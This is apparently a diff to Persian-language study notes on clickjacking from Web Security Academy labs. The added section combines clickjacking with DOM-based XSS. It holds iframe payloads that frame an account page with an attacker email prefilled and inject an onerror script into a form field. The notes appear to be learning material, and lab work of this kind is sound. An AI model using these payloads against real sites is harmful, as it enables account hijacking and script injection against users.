@@ -32,4 +32,9 @@
 ```HTML
 <iframe sandbox="allow-forms" src="https://ac1f1fd41fe93c54c00a5216000e009e.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
 ``` 
-- ی
+- **ترکیب با DOM-based XSS**
+  - در اینحالت payload عه XSS را درون فیلد Name قرار می دهیم:
+```HTML
+<iframe src="$url?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
+```
+- س
